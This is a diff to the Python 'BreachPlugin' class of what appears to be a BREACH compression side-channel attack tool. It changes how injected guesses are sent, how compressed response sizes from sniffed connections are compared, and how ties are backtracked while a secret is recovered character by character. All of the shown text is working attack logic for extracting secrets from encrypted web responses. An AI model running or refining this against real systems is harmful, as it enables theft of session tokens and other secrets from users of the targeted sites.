@@ -40,8 +40,11 @@ class BreachPlugin:
         
         if not self.sniffer.closed_connections.empty():
             log.error('Closed connections not empty: %r', self.sniffer.closed_connections.get())
+        value = self.core.prefix + base + c
+        if len(value) > 64:
+            value = value[-64:]
         self.core.send(placeholders={
-            'DATA': self.core.prefix + base + c
+            'DATA': value
         })
 
         conn = self.sniffer.closed_connections.get()
@@ -63,13 +66,13 @@ class BreachPlugin:
         #     'DATA': self.core.prefix
         # })
 
-        base = ''
+        base = self.core.start
         while len(base) < len(self.core.target):
             best = (9999, None)
             all_results = { c: 99999 for c in charset }
             back = [('', 9999)]
             while len(back) > 0:
-                b, _ = back.pop(0)
+                b, refsize = back.pop(0)
                 results = { c: 99999 for c in charset }
                 for c in charset:
                     size = self.test_char(b + c, base, best[0])
@@ -78,23 +81,38 @@ class BreachPlugin:
                         all_results[b+c] = size
                         if best[0] > size or best[0] == size and len(best[1]) < len(b+c):
                             best = size, b+c
-                minsize = min(best[0], min(results.values()))
-                best_results = []
-                for c, val in results.items():
-                    if val == minsize:
-                        best_results.append((b+c, minsize))
+                resminsize = min(results.values())
+                if refsize < resminsize and len(back) > 0 and min(map(lambda x: x[1], back)) >= resminsize:
+                    log.warning('Previous size of %s is lower than current size and no other available: %d < %d. Accept and restart', b, refsize, resminsize)
+                    break
+                else:
+                    minsize = min(best[0], resminsize)
+                    best_results = []
+                    for c, val in results.items():
+                        if val == minsize:
+                            best_results.append((b+c, minsize))
                 if len(best_results) == 1 and len(back) == 0:
                     break
                 else:
                     back += best_results
-                    back.sort(key=lambda x: x[1])
+                    back.sort(key=lambda x: (len(x[0]), x[1]))
                     self.print_backlog(minsize, back, base)
                     self.print_state(base)
-            best_results = []
-            for c, val in all_results.items():
-                if val == best[0]:
-                    best_results.append(c)
-            print('Results:', best_results)
+            while True:
+                best_results = []
+                for c, val in all_results.items():
+                    if val == best[0] and len(c) == len(best[1]):
+                        best_results.append(c)
+                print('Results:', best_results)
+                if len(best_results) <= 1:
+                    break
+                log.warning('To many results. Retry with 2nd best')
+                prev = best[0]
+                best = (9999, None)
+                for c, val in all_results.items():
+                    if val > prev and (val < best[0] or val == best[0] and len(best[1]) < len(c)):
+                        best = val, c
+
             base += best[1]
             self.print_state(base)
 
